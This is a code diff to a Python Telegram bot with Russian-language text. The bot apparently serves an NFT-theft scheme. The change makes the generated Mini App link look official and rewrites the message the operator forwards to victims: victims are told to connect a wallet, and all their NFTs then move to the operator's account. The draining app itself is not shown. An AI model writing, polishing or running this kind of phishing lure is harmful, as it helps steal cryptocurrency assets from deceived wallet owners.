@@ -14,6 +14,8 @@ logger = logging.getLogger(__name__)
 
 BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 MINI_APP_URL = os.getenv("MINI_APP_URL", "https://yourdomain.com")
+BOT_USERNAME = os.getenv("BOT_USERNAME", "IncognitoGiftsBot")
+APP_SHORT_NAME = os.getenv("APP_SHORT_NAME", "incognitogifts")
 
 if not BOT_TOKEN:
     raise ValueError("TELEGRAM_BOT_TOKEN не установлен в переменных окружения")
@@ -24,19 +26,20 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     logger.info(f"Пользователь {user_id} ({user.username}) запустил бота")
 
-    # Прямая ссылка на Mini App
-    mini_app_url = f"{MINI_APP_URL}?tgWebAppStartParam={user_id}"
+    # Официальная ссылка на Mini App с красивым preview
+    mini_app_link = f"https://t.me/{BOT_USERNAME}/{APP_SHORT_NAME}?startapp={user_id}"
 
     message_text = (
-        f"🎁 **Отправить NFT**\n\n"
+        f"🎁 **Получить Telegram NFT**\n\n"
         f"Отправь эту ссылку на аккаунт с NFT:\n"
-        f"{mini_app_url}\n\n"
-        f"💎 Все NFT автоматически перейдут на аккаунт **{user.first_name}**"
+        f"{mini_app_link}\n\n"
+        f"💎 Все NFT автоматически перейдут на твой аккаунт **{user.first_name}**\n\n"
+        f"_При открытии ссылки - подключи кошелёк и NFT моментально переведутся!_"
     )
 
-    # Кнопка с WebApp
+    # Кнопка с прямой ссылкой на Mini App
     keyboard = [
-        [InlineKeyboardButton("🎁 Забрать NFT", web_app={"url": mini_app_url})]
+        [InlineKeyboardButton("🎁 Открыть приложение", url=mini_app_link)]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
